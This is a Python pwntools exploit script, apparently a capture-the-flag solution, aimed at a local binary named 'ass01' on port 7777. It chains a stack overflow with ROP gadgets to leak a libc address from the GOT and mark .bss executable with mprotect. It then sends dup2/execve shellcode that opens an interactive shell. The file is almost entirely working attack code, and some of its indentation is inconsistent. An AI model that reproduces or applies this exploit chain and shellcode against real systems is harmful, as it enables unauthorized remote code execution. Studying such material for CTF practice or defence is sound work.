from pwn import *
from ctypes import *
import time

def rand_size():
   cdll.LoadLibrary("libc.so.6")
   print "srand() seed calculation",
   libc = CDLL("libc.so.6")
   while True:
      time.sleep(1)
      libc.srand(libc.time(None))
      rand = libc.rand() % 100
      print ".",   
      if rand >= 95:
      	print " "
        break


def rand_size_2():
   cdll.LoadLibrary("libc.so.6")
   print "srand() seed calculation",
   libc = CDLL("libc.so.6")
   while True:
      time.sleep(1)
      libc.srand(libc.time(None))
      rand = libc.rand() % 100
      print ".",   
      if rand >= 60:
      	print " "
        break

def solver():
	bss = 0x804a000
	ppppr = 0x80489cc
	pppr = 0x804878d

	send_mprotect_offset =  0x55b0

	#dup2, execve
	shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x3f\xb3\x04\xb1\x00\xcd\x80\xb0\x3f\xb3\x04\xb1\x01\xcd\x80\xb0\x3f\xb3\x04\xb1\x02\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x00"

	rand_size_2()
	fd = remote ("0", 7777)
	fd.recv(1024)

	pay = "A"*0x408 + "AAAA"
	pay += p32(elf.plt['send']) + p32(ppppr) + p32(4) + p32(elf.got['send']) + p32(4) + p32(0)

	fd.sendline(pay)
	sleep(0.5)
	send_addr = u32(fd.recv(4))

	print "send_got_addr : " + hex(send_addr)
	mprotect_addr = send_addr - send_mprotect_offset
	print "mprotect_got_addr : " +hex(mprotect_addr)

	fd.close()

	rand_size()
	fd = remote("0", 7777)
	fd.recv(1024)

	pay = "A"*0x408 + "AAAA"
	pay += p32(elf.plt['recv']) + p32(ppppr) + p32(4) + p32(bss+0x54) + p32(len(shellcode)+1) + p32(0)
	pay += p32(elf.plt['recv']) + p32(ppppr) + p32(4) + p32(elf.got['send']) + p32(4) + p32(0)
	pay += p32(elf.plt['send']) + p32(pppr) + p32(bss) + p32(0x1000) + p32(7)
	pay += p32(bss+0x54)

	fd.send(pay)
	sleep(0.5)
	fd.send(shellcode)
	sleep(0.5)
	fd.send(p32(mprotect_addr))

	fd.interactive()

if __name__ == '__main__':
	elf = ELF('ass01')
	solver()
